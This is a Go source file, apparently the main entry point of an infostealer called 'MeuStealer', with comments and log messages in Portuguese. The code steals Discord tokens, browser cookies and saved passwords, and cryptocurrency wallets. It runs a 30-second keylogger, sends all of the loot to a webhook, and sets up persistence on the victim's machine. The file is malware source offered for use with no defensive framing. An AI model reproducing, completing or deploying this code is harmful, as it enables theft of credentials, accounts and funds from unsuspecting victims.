package main

import (
    "fmt"
    "os"
    "time"

    "MeuStealer/browsers"
    "MeuStealer/common"
    "MeuStealer/crypto"
    "MeuStealer/discord"
    "MeuStealer/keylogger"
)

func main() {
    fmt.Println("[+] MeuStealer v1.0 - Iniciando coleta...")

    // 1. Coletar dados do Discord
    discordTokens, err := discord.ExtractTokens()
    if err != nil {
        fmt.Println("[-] Erro ao extrair tokens do Discord:", err)
    } else {
        fmt.Println("[+] Tokens do Discord coletados:", len(discordTokens))
    }

    // 2. Coletar dados de navegadores
    browserData, err := browsers.ExtractAllBrowsers()
    if err != nil {
        fmt.Println("[-] Erro ao extrair dados de navegadores:", err)
    } else {
        fmt.Println("[+] Dados de navegadores coletados:", len(browserData.Cookies)+len(browserData.Passwords))
    }

    // 3. Coletar carteiras de cripto
    cryptoData, err := crypto.ExtractWallets()
    if err != nil {
        fmt.Println("[-] Erro ao extrair carteiras:", err)
    } else {
        fmt.Println("[+] Carteiras de cripto coletadas:", len(cryptoData))
    }

    // 4. Iniciar keylogger (30 segundos de captura)
    fmt.Println("[+] Iniciando keylogger (30s)...")
    keys := keylogger.StartKeylogger(30)
    fmt.Println("[+] Keylogger finalizado. Teclas capturadas:", len(keys))

    // 5. Enviar todos os dados para o webhook
    allData := map[string]interface{}{
        "discord_tokens": discordTokens,
        "browser_data":   browserData,
        "crypto_wallets": cryptoData,
        "keylogger_data": keys,
    }

    err = common.SendToWebhook(allData)
    if err != nil {
        fmt.Println("[-] Erro ao enviar dados:", err)
    } else {
        fmt.Println("[+] Dados enviados com sucesso!")
    }

    // 6. Persistência (opcional)
    common.Persist("MeuStealer.exe")

    // 7. Auto-exclusão (opcional)
    time.Sleep(5 * time.Second)
    os.Exit(0)
}
